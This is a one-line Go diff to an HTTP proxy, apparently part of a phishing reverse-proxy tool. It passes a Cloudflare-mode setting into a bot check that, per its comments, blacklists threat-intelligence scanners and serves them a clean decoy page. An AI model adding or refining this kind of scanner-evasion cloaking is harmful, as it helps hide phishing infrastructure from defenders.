@@ -197,7 +197,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// Anti-bot: detect scanners/threat-intel crawlers before anything else.
 			// Permanently blacklists the IP+subnet and returns a clean decoy page.
-			if isBot, rq, rs := CheckAndBlockBot(req, from_ip, p.bl); isBot {
+			if isBot, rq, rs := CheckAndBlockBot(req, from_ip, p.bl, p.cfg.GetCloudflareMode()); isBot {
 				return rq, rs
 			}
 
